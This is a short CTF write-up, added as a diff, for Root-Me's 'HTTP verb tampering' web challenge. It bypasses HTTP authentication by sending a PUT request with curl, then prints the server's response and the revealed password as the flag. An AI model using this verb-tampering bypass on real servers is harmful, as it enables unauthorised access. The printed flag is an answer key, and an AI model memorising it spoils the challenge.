@@ -1,0 +1,21 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch8/
+
+	Challenge's Name : HTTP verb tampering
+	
+	Hint : HTTP authentication
+	
+	Pada soal meminta Bypass the security establishment.
+	
+	Solusi : By pass dengan command curl PUT method
+	
+	curl -X PUT http://challenge01.root-me.org/web-serveur/ch8/
+	
+	Result : 
+  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+  <html>
+    <head></head>
+      <h1>Mot de passe / password : a23e$dme96d3saez$$prap</h1>
+    </body>
+  </html>
+	
+	Flag : a23e$dme96d3saez$$prap
